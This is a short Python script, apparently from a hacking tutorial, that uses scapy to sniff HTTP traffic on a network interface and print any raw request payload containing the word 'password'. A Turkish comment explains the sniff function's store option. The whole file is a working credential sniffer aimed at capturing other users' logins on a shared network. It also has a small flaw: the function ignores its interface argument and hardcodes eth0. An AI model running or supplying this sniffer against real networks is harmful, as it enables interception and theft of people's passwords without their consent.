# pip3 install scapy_http 

import scapy.all as scapy
from scapy_http import http

def listen_packets(interface):
	scapy.sniff(iface="eth0",store=False,prn=analyze_packets) 

#store True olursa alınan paketler hafızaya kaydedilir, false da kaydedilmez.

def analyze_packets(packet):
	if packet.haslayer(http.HTTPRequest):
		if packet.haslayer(scapy.Raw):
			packet = str(packet[scapy.Raw].load)
			if "password" in packet:
				print(packet)
listen_packets("eth0")